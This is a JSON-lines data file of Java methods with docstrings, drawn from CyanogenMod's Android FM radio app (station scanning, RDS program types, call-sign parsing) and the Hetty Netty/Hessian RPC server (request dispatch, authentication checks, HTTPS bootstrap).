{"docstring": "/** SEEK Station with the matching PI */\n", "func_signal": "private void initiatePISearch(int pi)", "code": "{\n    Log.d(LOGTAG, \"initiatePISearch\");\n    if (mService != null) {\n        try {\n            if (!isSeekActive()) {\n                mIsSeeking = mService.seekPI(pi);\n                if (mIsSeeking == false) {\n                    mCommandFailed = CMD_SEEKPI;\n                    Log.e(LOGTAG, \" mService.seekPI failed\");\n                    showDialog(DIALOG_CMD_FAILED);\n                }\n            }\n        } catch (RemoteException e) {\n            e.printStackTrace();\n        }\n    }\n    updateSearchProgress();\n}", "path": "src\\com\\android\\fm\\radio\\FMRadio.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/**\n * Scrolling Message Handler\n */\n", "func_signal": "@Override\npublic void handleMessage(Message msg)", "code": "{\n    switch (msg.what) {\n        case SCROLLER_MSG_START:\n            mStatus = SCROLLER_RUNNING;\n            updateText();\n            break;\n        case SCROLLER_MSG_TICK:\n            updateText();\n            break;\n        case SCROLLER_MSG_RESTART:\n            if (mStatus == SCROLLER_RUNNING) {\n                startScroll();\n            }\n            break;\n    }\n}", "path": "src\\com\\android\\fm\\radio\\FMRadio.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/** Scan related */\n", "func_signal": "private void initiateSearch(int pty)", "code": "{\n    synchronized (this) {\n        mIsScaning = true;\n        if (mService != null) {\n            try {\n                mIsScaning = mService.scan(pty);\n                if (mIsScaning == false) {\n                    mCommandFailed = CMD_SCAN;\n                    Log.e(LOGTAG, \" mService.scan failed\");\n                    showDialog(DIALOG_CMD_FAILED);\n                } else {\n                    mScanPty = pty;\n                }\n            } catch (RemoteException e) {\n                e.printStackTrace();\n            }\n            updateSearchProgress();\n        }\n    }\n}", "path": "src\\com\\android\\fm\\radio\\FMRadio.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/**\n * Routine parses the PI Code from Integer to Call Sign String Example:\n * 0x54A6 -> KZZY\n */\n", "func_signal": "public static String parsePI(int piCode)", "code": "{\n    String callSign = \"\";\n    if ((piCode >> 8) == 0xAF) {// CALL LETTERS THAT MAP TO PI CODES = _ _ 0\n                                // 0.\n        piCode = ((piCode & 0xFF) << 8);\n    }\n    /*\n     * Run the second exception NOTE: For 9 special cases 1000,2000,..,9000\n     * a double mapping occurs utilizing exceptions 1 and 2:\n     * 1000->A100->AFA1;2000->A200->AFA2; ... ;\n     * 8000->A800->AFA8;9000->A900->AFA9\n     */\n    if ((piCode >> 12) == 0xA) {// CALL LETTERS THAT MAP TO PI CODES = _ 0 _\n                                // _.\n        piCode = ((piCode & 0xF00) << 4) + (piCode & 0xFF);\n    }\n    if ((piCode >= 0x1000) && (piCode <= 0x994E)) {\n        String ShartChar;\n        /* KAAA - KZZZ */\n        if ((piCode >= 0x1000) && (piCode <= 0x54A7)) {\n            piCode -= 0x1000;\n            ShartChar = \"K\";\n        } else { /* WAAA - WZZZ */\n            piCode -= 0x54A8;\n            ShartChar = \"W\";\n        }\n        int CharDiv = piCode / 26;\n        int CharPos = piCode - (CharDiv * 26);\n        char c3 = (char) ('A' + CharPos);\n\n        piCode = CharDiv;\n        CharDiv = piCode / 26;\n        CharPos = piCode - (CharDiv * 26);\n        char c2 = (char) ('A' + CharPos);\n\n        piCode = CharDiv;\n        CharDiv = piCode / 26;\n        CharPos = piCode - (CharDiv * 26);\n        char c1 = (char) ('A' + CharPos);\n        callSign = ShartChar + c1 + c2 + c3;\n    } else if ((piCode >= 0x9950) && (piCode <= 0x9EFF)) {// 3-LETTER-ONLY\n                                                          // CALL LETTERS\n        callSign = get3LetterCallSign(piCode);\n    } else {// NATIONALLY-LINKED RADIO STATIONS CARRYING DIFFERENT CALL\n            // LETTERS\n        callSign = getOtherCallSign(piCode);\n    }\n    return callSign;\n}", "path": "src\\com\\android\\fm\\radio\\PresetStation.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/** get Strongest Stations */\n", "func_signal": "private void initiateSearchList()", "code": "{\n    synchronized (this) {\n        mIsSearching = false;\n        if (mService != null) {\n            try {\n                mIsSearching = mService.searchStrongStationList(NUM_AUTO_PRESETS_SEARCH);\n                if (mIsSearching == false) {\n                    mCommandFailed = CMD_SEARCHLIST;\n                    Log.e(LOGTAG, \" mService.searchStrongStationList failed\");\n                    showDialog(DIALOG_CMD_FAILED);\n                }\n            } catch (RemoteException e) {\n                e.printStackTrace();\n            }\n            updateSearchProgress();\n        }\n    }\n}", "path": "src\\com\\android\\fm\\radio\\FMRadio.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/**\n * get the Text String for the RBDS Program type Code\n */\n", "func_signal": "public static String getRBDSPtyString(int pty)", "code": "{\n    String ptyStr = \"\";\n    switch (pty) {\n        case 1: {\n            ptyStr = \"News\";\n            break;\n        }\n        case 2: {\n            ptyStr = \"Information\";\n            break;\n        }\n        case 3: {\n            ptyStr = \"Sports\";\n            break;\n        }\n        case 4: {\n            ptyStr = \"Talk\";\n            break;\n        }\n        case 5: {\n            ptyStr = \"Rock\";\n            break;\n        }\n        case 6: {\n            ptyStr = \"Classic Rock\";\n            break;\n        }\n        case 7: {\n            ptyStr = \"Adult Hits\";\n            break;\n        }\n        case 8: {\n            ptyStr = \"Soft Rock\";\n            break;\n        }\n        case 9: {\n            ptyStr = \"Top 40\";\n            break;\n        }\n        case 10: {\n            ptyStr = \"Country\";\n            break;\n        }\n        case 11: {\n            ptyStr = \"Oldies\";\n            break;\n        }\n        case 12: {\n            ptyStr = \"Soft\";\n            break;\n        }\n        case 13: {\n            ptyStr = \"Nostalgia\";\n            break;\n        }\n        case 14: {\n            ptyStr = \"Jazz\";\n            break;\n        }\n        case 15: {\n            ptyStr = \"Classical\";\n            break;\n        }\n        case 16: {\n            ptyStr = \"Rhythm and Blues\";\n            break;\n        }\n        case 17: {\n            ptyStr = \"Soft Rhythm and Blues\";\n            break;\n        }\n        case 18: {\n            ptyStr = \"Foreign Language\";\n            break;\n        }\n        case 19: {\n            ptyStr = \"Religious Music\";\n            break;\n        }\n        case 20: {\n            ptyStr = \"Religious Talk\";\n            break;\n        }\n        case 21: {\n            ptyStr = \"Personality\";\n            break;\n        }\n        case 22: {\n            ptyStr = \"Public\";\n            break;\n        }\n        case 23: {\n            ptyStr = \"College\";\n            break;\n        }\n        case 29: {\n            ptyStr = \"Weather\";\n            break;\n        }\n        case 30: {\n            ptyStr = \"Emergency Test\";\n            break;\n        }\n        case 31: {\n            ptyStr = \"Emergency\";\n            break;\n        }\n        default: {\n            ptyStr = \"\";\n            // Log.e(FMRadio.LOGTAG, \"Unknown RBDS ProgramType [\" + pty +\n            // \"]\");\n            break;\n        }\n    }\n    return ptyStr;\n}", "path": "src\\com\\android\\fm\\radio\\PresetStation.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/**\n * Routine to get the Frequency in String from an integer\n *\n * @param frequency : Frequency to be converted (ex: 96500)\n * @return String : Frequency in String form (ex: 96.5)\n */\n", "func_signal": "public static String getFrequencyString(int frequency)", "code": "{\n    double frequencyDbl = frequency / 1000.0;\n    String frequencyString = \"\" + frequencyDbl;\n    return frequencyString;\n}", "path": "src\\com\\android\\fm\\radio\\PresetStation.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/*\n * If a user selects a new station in this list, this routine will be called\n * to to update the list.\n */\n", "func_signal": "public synchronized boolean setSelectedStation(PresetStation selectStation)", "code": "{\n    int totalPresets = mPresetList.size();\n    if (selectStation != null) {\n        for (int presetNum = 0; presetNum < totalPresets; presetNum++) {\n            PresetStation station = mPresetList.get(presetNum);\n            if (station != null) {\n                if (selectStation.getFrequency() == station.getFrequency()) {\n                    if (selectStation.getName().equalsIgnoreCase(station.getName())) {\n                        mCurrentStation = presetNum;\n                        return true;\n                    }\n                }\n            }\n        }\n    }\n    return false;\n}", "path": "src\\com\\android\\fm\\radio\\PresetList.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/*\n * Check if the same station already exists in a List to update the list.\n */\n", "func_signal": "public synchronized boolean sameStationExists(PresetStation compareStation)", "code": "{\n    int totalPresets = mPresetList.size();\n    if (compareStation != null) {\n        for (int presetNum = 0; presetNum < totalPresets; presetNum++) {\n            PresetStation station = mPresetList.get(presetNum);\n            if (station != null) {\n                if (compareStation.getFrequency() == station.getFrequency()) {\n                    return true;\n                }\n            }\n        }\n    }\n    return false;\n}", "path": "src\\com\\android\\fm\\radio\\PresetList.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/**\n */\n", "func_signal": "public FrequencyPickerDialog(Context context, FmConfig fmConfig, int frequency,\n        OnFrequencySetListener callback)", "code": "{\n    // this(context, android.R.style.Theme_Dialog, fmConfig, frequency,\n    // callback);\n    this(context, com.android.internal.R.style.Theme_Dialog_Alert, fmConfig, frequency,\n            callback);\n}", "path": "src\\com\\android\\fm\\utils\\FrequencyPickerDialog.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/* Returns the index of the list just created */\n", "func_signal": "public static int createPresetList(String name)", "code": "{\n    int numLists = mListOfPlists.size();\n    mListOfPlists.add(new PresetList(name));\n    String index = String.valueOf(numLists);\n    mNameMap.put(name, index);\n    repopulateEntryValueLists();\n    return numLists;\n}", "path": "src\\com\\android\\fm\\radio\\FmSharedPreferences.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/** Add \"station\" into the Preset List indexed by \"listIndex\" */\n", "func_signal": "public static void addStation(int listIndex, PresetStation station)", "code": "{\n    /*\n     * If no lists exists and a new station is added, add a new Preset List\n     * if \"listIndex\" requested was \"0\"\n     */\n    addListIfEmpty(listIndex);\n    if (getNumList() > listIndex) {\n        mListOfPlists.get(listIndex).addStation(station);\n    }\n}", "path": "src\\com\\android\\fm\\radio\\FmSharedPreferences.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/** get the Text String for the Program type Code */\n", "func_signal": "public static String getRDSPtyString(int pty)", "code": "{\n    String ptyStr = \"\";\n    switch (pty) {\n        case 1: {\n            ptyStr = \"News\";\n            break;\n        }\n        case 2: {\n            ptyStr = \"Current Affairs\";\n            break;\n        }\n        case 3: {\n            ptyStr = \"Information\";\n            break;\n        }\n        case 4: {\n            ptyStr = \"Sport\";\n            break;\n        }\n        case 5: {\n            ptyStr = \"Education\";\n            break;\n        }\n        case 6: {\n            ptyStr = \"Drama\";\n            break;\n        }\n        case 7: {\n            ptyStr = \"Culture\";\n            break;\n        }\n        case 8: {\n            ptyStr = \"Science\";\n            break;\n        }\n        case 9: {\n            ptyStr = \"Varied\";\n            break;\n        }\n        case 10: {\n            ptyStr = \"Pop Music\";\n            break;\n        }\n        case 11: {\n            ptyStr = \"Rock Music\";\n            break;\n        }\n        case 12: {\n            ptyStr = \"Easy Listening Music\";\n            break;\n        }\n        case 13: {\n            ptyStr = \"Light classical\";\n            break;\n        }\n        case 14: {\n            ptyStr = \"Serious classical\";\n            break;\n        }\n        case 15: {\n            ptyStr = \"Other Music\";\n            break;\n        }\n        case 16: {\n            ptyStr = \"Weather\";\n            break;\n        }\n        case 17: {\n            ptyStr = \"Finance\";\n            break;\n        }\n        case 18: {\n            ptyStr = \"Children programs\";\n            break;\n        }\n        case 19: {\n            ptyStr = \"Social Affairs\";\n            break;\n        }\n        case 20: {\n            ptyStr = \"Religion\";\n            break;\n        }\n        case 21: {\n            ptyStr = \"Phone In\";\n            break;\n        }\n        case 22: {\n            ptyStr = \"Travel\";\n            break;\n        }\n        case 23: {\n            ptyStr = \"Leisure\";\n            break;\n        }\n        case 24: {\n            ptyStr = \"Jazz Music\";\n            break;\n        }\n        case 25: {\n            ptyStr = \"Country Music\";\n            break;\n        }\n        case 26: {\n            ptyStr = \"National Music\";\n            break;\n        }\n        case 27: {\n            ptyStr = \"Oldies Music\";\n            break;\n        }\n        case 28: {\n            ptyStr = \"Folk Music\";\n            break;\n        }\n        case 29: {\n            ptyStr = \"Documentary\";\n            break;\n        }\n        case 30: {\n            ptyStr = \"Emergency Test\";\n            break;\n        }\n        case 31: {\n            ptyStr = \"Emergency\";\n            break;\n        }\n        default: {\n            ptyStr = \"\";\n            // Log.e(FMRadio.LOGTAG, \"Unknown RDS ProgramType [\" + pty +\n            // \"]\");\n            break;\n        }\n    }\n    return ptyStr;\n}", "path": "src\\com\\android\\fm\\radio\\PresetStation.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/**\n * Execute a request. The path-info of the request selects the bean. Once\n * the bean's selected, it will be applied.\n */\n", "func_signal": "public void service(String serviceName, HttpRequest req, HttpResponse res,\n\t\tByteArrayOutputStream os)", "code": "{\n\tbyte[] bytes = req.getContent().array();//get request content\n\tInputStream is = new ByteArrayInputStream(bytes);\n\n\tSerializerFactory serializerFactory = getSerializerFactory();\n\tString username = null;\n\tString password = null;\n\tString[] authLink = getUsernameAndPassword(req);\n\tusername = authLink[0].equals(\"\")?null:authLink[0];\n\tpassword = authLink[1].equals(\"\")?null:authLink[1];\n\tString clientIP = request.getHeader(\"Client-IP\");\n\tRequestWrapper rw = new RequestWrapper(username, password, clientIP, serviceName);\n\t\n\t\n\tinvoke(rw, is, os, serializerFactory);\n}", "path": "src\\main\\java\\com\\hetty\\core\\HettyHandler.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * Create the exception.\n */\n", "func_signal": "public HettyException(Throwable rootCause)", "code": "{\n\tsuper(String.valueOf(rootCause));\n\n\tthis.rootCause = rootCause;\n}", "path": "src\\main\\java\\com\\hetty\\object\\HettyException.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * Create the exception.\n */\n", "func_signal": "public HettyException(String message, Throwable rootCause)", "code": "{\n\tsuper(message);\n\n\tthis.rootCause = rootCause;\n}", "path": "src\\main\\java\\com\\hetty\\object\\HettyException.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * according the request to invoke the method and return the invoke result\n * 1.get serviceName,methodName,user,password,version\n * 2.get version\n * 3.get provider\n * 4.invoke\n */\n", "func_signal": "public static Object handleRequest(RequestWrapper request)", "code": "{\n\tObject result = null;\n\tif(HettyConfig.getInstance().getDevMod()){\n\t\tServiceReporter.reportBeforeInvoke(request);\n\t}\n\t\n\ttry {\n\t\tString serviceName = request.getServiceName();\n\t\tString methodName = request.getMethodName();\n\t\tString user = request.getUser();\n\t\tString password = request.getPassword();\n\n\t\tboolean isRight = HettySecurity.checkPermission(user, password);\n\t\tif (!isRight) {\n\t\t\tthrow new RuntimeException(\n\t\t\t\t\t\"the user or password is wrong,please check your user and password.\");\n\t\t}\n\t\tStringBuffer serviceKey = new StringBuffer(user).append(\"#\")\n\t\t\t\t.append(serviceName);\n\t\tString version = versionMap.get(serviceKey.toString());\n\t\tService service = serviceMap.get(serviceName);\n\t\tif (service == null) {\n\t\t\tthrow new RuntimeException(\"we cannot find service[\"\n\t\t\t\t\t+ serviceName + \"].\");\n\t\t}\n\n\t\tServiceProvider serviceProvider = service\n\t\t\t\t.getProviderByVersion(version);\n\t\tClass<?> processorClass = serviceProvider.getProcessorClass();\n\t\tObject processor = processorClass.newInstance();\n\t\tObject[] args = request.getArgs();\n\n\t\tMethodAccess method = serviceProvider.getMethodAccess();\n\t\tint methodIndex = method.getIndex(methodName,request.getArgsTypes());\n\t\tresult = method.invoke(processor, methodIndex, args);\n\t} catch (InstantiationException e) {\n\t\tlogger.error(e.getMessage(), e);\n\t\tthrow new RuntimeException(e);\n\t} catch (IllegalAccessException e) {\n\t\tlogger.error(e.getMessage(), e);\n\t\tthrow new RuntimeException(e);\n\t} catch (IllegalArgumentException e) {\n\t\tlogger.error(e.getMessage(), e);\n\t\tthrow new RuntimeException(e);\n\t}\n\treturn result;\n}", "path": "src\\main\\java\\com\\hetty\\core\\ServiceHandler.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * Create a new hessian skeleton.\n * \n * @param apiClass\n *            the API interface\n */\n", "func_signal": "public ServiceMetaData(Class<?> apiClass,boolean overloadEnabled)", "code": "{\n\t_apiClass = apiClass;\n\n\tMethod[] methodList = apiClass.getMethods();\n\n\tfor (int i = 0; i < methodList.length; i++) {\n\t\tMethod method = methodList[i];\n\n\t\tif (_methodMap.get(method.getName()) == null)\n\t\t\t_methodMap.put(method.getName(), methodList[i]);\n\n\t\tClass<?>[] param = method.getParameterTypes();\n\t\tString mangledName = method.getName() + \"__\" + param.length;\n\t\t_methodMap.put(mangledName, methodList[i]);\n\n\t\tif(overloadEnabled){\n\t\t\t_methodMap.put(mangleName(method, false), methodList[i]);\n\t\t}\n\t}\n}", "path": "src\\main\\java\\com\\hetty\\core\\ServiceMetaData.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * Returns the API class of the object URLs\n */\n", "func_signal": "public String getObjectClassName()", "code": "{\n\tif (_objectClass != null)\n\t\treturn _objectClass.getName();\n\telse\n\t\treturn getAPIClassName();\n}", "path": "src\\main\\java\\com\\hetty\\core\\ServiceMetaData.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * init service metaData\n */\n", "func_signal": "private void initServiceMetaData()", "code": "{\n\t// TODO Auto-generated method stub\n    \tlogger.info(\"init service MetaData...........\");\n    \tMetadataProcessor.initMetaDataMap();\n}", "path": "src\\main\\java\\com\\hetty\\core\\Hetty.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * return serviceProvider according serviceName\n * @param version\n * @return\n */\n", "func_signal": "public ServiceProvider getProviderByVersion(String version)", "code": "{\n\tif(version == null){\n\t\treturn providerMap.get(defaultVersion);\n\t}else{\n\t\treturn providerMap.get(version);\n\t}\n}", "path": "src\\main\\java\\com\\hetty\\object\\Service.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * 1.if service has a non default version,add\n * 2.put service to map\n * @param service\n */\n", "func_signal": "public static void addToServiceMap(Service service)", "code": "{\n\tif(service.getDefaultVersion() == null){\n\t\tIterator<String> iter = service.getServiceProvider().keySet().iterator(); \n\t\tif(iter.hasNext()){\n\t\t    String defaultVersion = iter.next();\n\t\t    service.setDefaultVersion(defaultVersion);\n\t\t}else{\n\t\t\tthrow new HettyException(\"your have a wrong in service config.check service[\"+service.getName()+\"]'s provider.\");\n\t\t}\n\t}\n\tserviceMap.put(service.getName(), service);\n}", "path": "src\\main\\java\\com\\hetty\\core\\ServiceHandler.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n\t * init service metaData\n\t */\n", "func_signal": "private void initHettySecurity()", "code": "{\n\t\t// TODO Auto-generated method stub\n\tlogger.info(\"init hetty security...........\");\n\tApplication app = new Application(hettyConfig.getServerKey(),hettyConfig.getServerSecret());\n\tHettySecurity.addToApplicationMap(app);\n\t}", "path": "src\\main\\java\\com\\hetty\\core\\Hetty.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * check permission\n * @param user\n * @param password\n */\n", "func_signal": "public static boolean checkPermission(String user,String password)", "code": "{\n\tif(StringUtil.isEmpty(user) || StringUtil.isEmpty(password)){\n\t\tthrow new IllegalArgumentException(\"user or password is null,please check.\");\n\t}\n\tif(applicationMap.containsKey(user) && applicationMap.get(user).getPassword().equals(password)){\n\t\treturn true;\n\t}else{\n\t\treturn false;\n\t}\n}", "path": "src\\main\\java\\com\\hetty\\core\\HettySecurity.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * put version info to map\n * @param version\n */\n", "func_signal": "public static void addToVersionMap(ServiceVersion version)", "code": "{\n\tif(version.getVersion() == null){\n\t\treturn;\n\t}\n\tif(!isServiceExits(version.getService())){\n\t\tthrow new HettyException(\"please check your configure file,service[\"+version.getService()+\"] can't find.\");\n\t}\n\tversionMap.put(version.getUser().append(\"#\").append(version.getService()).toString(), version.getVersion());\n}", "path": "src\\main\\java\\com\\hetty\\core\\ServiceHandler.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * start hetty\n */\n", "func_signal": "public void start()", "code": "{\n\tinit();\n\tserverLog();\n}", "path": "src\\main\\java\\com\\hetty\\core\\Hetty.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * Gets the serializer factory.\n */\n", "func_signal": "public SerializerFactory getSerializerFactory()", "code": "{\n\tif (_serializerFactory == null)\n\t\t_serializerFactory = new SerializerFactory();\n\n\treturn _serializerFactory;\n}", "path": "src\\main\\java\\com\\hetty\\core\\HettyHandler.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * check https config\n * @return\n */\n", "func_signal": "private boolean  checkHttpsConfig()", "code": "{\n\tif(StringUtil.isNotEmpty(hettyConfig.getKeyStorePath())){\n\t\tif(!FileUtil.getFile(hettyConfig.getKeyStorePath()).exists()){\n\t\t\tthrow new HettyException(\"we can't find the file which you configure:[ssl.keystore.file]\");\n\t\t}\n\t}else if(StringUtil.isNotEmpty(hettyConfig.getCertificateKeyFile()) && \n\t\t\tStringUtil.isNotEmpty(hettyConfig.getCertificateFile())){\n\t\tif(!FileUtil.getFile(hettyConfig.getCertificateKeyFile()).exists()){\n\t\t\tthrow new HettyException(\"we can't find the file which you configure:[ssl.certificate.key.file]\");\n\t\t}\n\t\tif(!FileUtil.getFile(hettyConfig.getCertificateFile()).exists()){\n\t\t\tthrow new HettyException(\"we can't find the file which you configure:[ssl.certificate.file]\");\n\t\t}\n\t}else{\n\t\tthrow new HettyException(\"please check your ssl's config.\");\n\t}\n\treturn true;\n}", "path": "src\\main\\java\\com\\hetty\\core\\Hetty.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * check the netty listen port\n * @param listenPort\n * @return\n */\n", "func_signal": "private boolean checkPortConfig(int listenPort)", "code": "{\n\t\tif (listenPort < 0 || listenPort > 65536) {\n\t\t\tthrow new IllegalArgumentException(\"Invalid start port: \"\n\t\t\t\t\t+ listenPort);\n\t\t}\n\t\tServerSocket ss = null;\n\t\tDatagramSocket ds = null;\n\t\ttry {\n\t\t\tss = new ServerSocket(listenPort);\n\t\t\tss.setReuseAddress(true);\n\t\t\tds = new DatagramSocket(listenPort);\n\t\t\tds.setReuseAddress(true);\n\t\t\treturn true;\n\t\t} catch (IOException e) {\n\t\t} finally {\n\t\t\tif (ds != null) {\n\t\t\t\tds.close();\n\t\t\t}\n\t\t\tif (ss != null) {\n\t\t\t\ttry {\n\t\t\t\t\tss.close();\n\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t// should not be thrown, just detect port available.\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn false;\n\t}", "path": "src\\main\\java\\com\\hetty\\core\\Hetty.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * init hetty server info\n */\n", "func_signal": "private void initServerInfo()", "code": "{\n\thttpListenPort = hettyConfig.getHttpPort();\n\thttpsListenPort = hettyConfig.getHttpsPort();\n}", "path": "src\\main\\java\\com\\hetty\\core\\Hetty.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * Mangles a classname.\n */\n", "func_signal": "public static String mangleClass(Class<?> cl, boolean isFull)", "code": "{\n\tString name = cl.getName();\n\n\tif (name.equals(\"boolean\") || name.equals(\"java.lang.Boolean\"))\n\t\treturn \"boolean\";\n\telse if (name.equals(\"int\") || name.equals(\"java.lang.Integer\")\n\t\t\t|| name.equals(\"short\") || name.equals(\"java.lang.Short\")\n\t\t\t|| name.equals(\"byte\") || name.equals(\"java.lang.Byte\"))\n\t\treturn \"int\";\n\telse if (name.equals(\"long\") || name.equals(\"java.lang.Long\"))\n\t\treturn \"long\";\n\telse if (name.equals(\"float\") || name.equals(\"java.lang.Float\")\n\t\t\t|| name.equals(\"double\") || name.equals(\"java.lang.Double\"))\n\t\treturn \"double\";\n\telse if (name.equals(\"java.lang.String\")\n\t\t\t|| name.equals(\"com.caucho.util.CharBuffer\")\n\t\t\t|| name.equals(\"char\") || name.equals(\"java.lang.Character\")\n\t\t\t|| name.equals(\"java.io.Reader\"))\n\t\treturn \"string\";\n\telse if (name.equals(\"java.util.Date\")\n\t\t\t|| name.equals(\"com.caucho.util.QDate\"))\n\t\treturn \"date\";\n\telse if (InputStream.class.isAssignableFrom(cl) || name.equals(\"[B\"))\n\t\treturn \"binary\";\n\telse if (cl.isArray()) {\n\t\treturn \"[\" + mangleClass(cl.getComponentType(), isFull);\n\t} else if (name.equals(\"org.w3c.dom.Node\")\n\t\t\t|| name.equals(\"org.w3c.dom.Element\")\n\t\t\t|| name.equals(\"org.w3c.dom.Document\"))\n\t\treturn \"xml\";\n\telse if (isFull)\n\t\treturn name;\n\telse {\n\t\tint p = name.lastIndexOf('.');\n\t\tif (p > 0)\n\t\t\treturn name.substring(p + 1);\n\t\telse\n\t\t\treturn name;\n\t}\n}", "path": "src\\main\\java\\com\\hetty\\core\\ServiceMetaData.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n * init plugins\n */\n", "func_signal": "private void initPlugins()", "code": "{\n\tlogger.info(\"init plugins...........\");\n\tList<Class<?>> pluginList = hettyConfig.getPluginClassList();\n\ttry {\n\t\tfor (Class<?> cls : pluginList) {\n\t\t\tIPlugin p;\n\t\t\tp = (IPlugin) cls.newInstance();\n\t\t\tp.start();\n\t\t}\n\t} catch (InstantiationException e) {\n\t\tlogger.error(\"init plugin failed.\");\n\t\te.printStackTrace();\n\t} catch (IllegalAccessException e) {\n\t\t// TODO Auto-generated catch block\n\t\tlogger.error(\"init plugin failed.\");\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\main\\java\\com\\hetty\\core\\Hetty.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
{"docstring": "/**\n\t * init https bootstrap\n\t */\n", "func_signal": "private void initHttpsBootstrap()", "code": "{\n\tif(!checkHttpsConfig()){\n\t\treturn;\n\t}\n\tlogger.info(\"init HTTPS Bootstrap...........\");\n\t\tThreadFactory serverBossTF = new NamedThreadFactory(\"HETTY-BOSS-\");\n\t\tThreadFactory serverWorkerTF = new NamedThreadFactory(\"HETTY-WORKER-\");\n\t\thttpsBootstrap = new ServerBootstrap(new NioServerSocketChannelFactory(\n\t\t\t\tExecutors.newCachedThreadPool(serverBossTF),\n\t\t\t\tExecutors.newCachedThreadPool(serverWorkerTF)));\n\t\thttpsBootstrap.setOption(\"tcpNoDelay\", Boolean.parseBoolean(hettyConfig\n\t\t\t\t.getProperty(\"hetty.tcp.nodelay\", \"true\")));\n\t\thttpsBootstrap.setOption(\"reuseAddress\", Boolean.parseBoolean(hettyConfig\n\t\t\t\t.getProperty(\"hetty.tcp.reuseaddress\", \"true\")));\n\t\t\n\t\tint coreSize = hettyConfig.getServerCorePoolSize();\n\t\tint maxSize = hettyConfig.getServerMaximumPoolSize();\n\t\tint keepAlive = hettyConfig.getServerKeepAliveTime();\n\t\tThreadFactory threadFactory = new NamedThreadFactory(\"hetty-\");\n\t\tExecutorService threadPool = new ThreadPoolExecutor(coreSize, maxSize, keepAlive,\n\t\t\t\tTimeUnit.SECONDS, new SynchronousQueue<Runnable>(), threadFactory);\n\t\thttpsBootstrap.setPipelineFactory(new SslHettyChannelPipelineFactory(threadPool));\n\t\t\n\t\tif (!checkPortConfig(httpsListenPort)) {\n\t\t\tthrow new IllegalStateException(\"port: \" + httpsListenPort + \" already in use!\");\n\t\t}\n\t\thttpsBootstrap.bind(new InetSocketAddress(httpsListenPort));\n}", "path": "src\\main\\java\\com\\hetty\\core\\Hetty.java", "repo_name": "xishuixixia/Hetty", "stars": 106, "license": "None", "language": "java", "size": 8247}
